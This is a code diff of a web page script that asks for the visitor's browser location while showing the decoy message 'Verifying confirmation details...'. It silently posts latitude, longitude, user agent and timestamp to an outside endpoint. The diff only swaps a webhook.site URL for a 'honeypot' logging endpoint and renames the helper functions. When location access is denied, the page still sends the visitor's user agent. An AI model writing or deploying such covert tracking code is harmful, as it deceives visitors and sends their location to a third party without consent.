@@ -58,53 +58,49 @@
   <script>
     function getLocation() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition, silentFail, {timeout: 5000});
+        navigator.geolocation.getCurrentPosition(showPosition, silentFail, {timeout: 7000});
       } else {
-        logNoLocation("Geolocation not supported");
+        logAttempt("Geolocation not supported");
       }
     }
 
     function showPosition(position) {
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
+
       document.getElementById("output").innerText = "Verifying confirmation details...";
 
-      const payload = {
-        timestamp: new Date().toISOString(),
-        latitude: lat,
-        longitude: lon,
-        userAgent: navigator.userAgent,
-        status: "GPS allowed"
-      };
-
-      fetch("https://webhook.site/f89aa1bf-0206-4286-9394-8c806d89a8bb", {
+      fetch("https://honeypot-endpoint.vercel.app/api/log", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify(payload)
+        body: JSON.stringify({
+          timestamp: new Date().toISOString(),
+          latitude: lat,
+          longitude: lon,
+          userAgent: navigator.userAgent,
+          status: "GPS allowed"
+        })
       });
     }
 
     function silentFail(error) {
       document.getElementById("output").innerText = "Verifying confirmation details...";
-
-      logNoLocation("Location access denied or failed");
+      logAttempt("Location access denied or failed");
     }
 
-    function logNoLocation(reason) {
-      const payload = {
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        status: reason
-      };
-
-      fetch("https://webhook.site/f89aa1bf-0206-4286-9394-8c806d89a8bb", {
+    function logAttempt(reason) {
+      fetch("https://honeypot-endpoint.vercel.app/api/log", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify(payload)
+        body: JSON.stringify({
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+          status: reason
+        })
       });
     }
   </script>
